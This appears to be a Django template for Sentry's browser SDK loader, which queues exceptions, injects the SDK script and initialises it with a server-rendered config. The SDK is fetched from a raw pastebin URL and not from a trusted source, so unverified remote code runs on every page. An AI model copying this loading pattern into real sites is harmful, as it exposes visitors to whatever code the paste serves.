{% load sentry_helpers %}
(function(_window, _document) {
  var namespace = _window.SentryObject;
  var sentry = _window[namespace] || {};
  var queue = sentry.q || [];

  function drainQueue() {
    var SDK = _window.Sentry;

    console.log('Draining queue...');

    for (var i = 0; i < queue.length; i++) {
      console.log('Queued event captured');
      SDK.captureException(queue[i]);
    }
  }

  function attachSDK(url) {
    var head = _document.getElementsByTagName('head')[0];
    var script = _document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    head.appendChild(script);
    return script;
  }

  function configSDK(config) {
    try {
      var SDK = _window.Sentry;
      SDK.init(config);
      console.log('@sentry/browser configured');
    } catch (o_O) {
      console.error(
        'Something went wrong, please call 911 and tell them that Sentry is broken'
      );
    }
  }

  var script = attachSDK('https://pastebin.com/raw/ncDxxR1U');
  console.log('Fetching @sentry/browser...');
  script.addEventListener('load', function() {
    console.log('@sentry/browser fetched');
    configSDK({{ config|to_json|safe }});
    if (queue.length) {
      console.log(queue.length + ' exceptions captured and queued');
      drainQueue();
    }
  });
})(window, document);
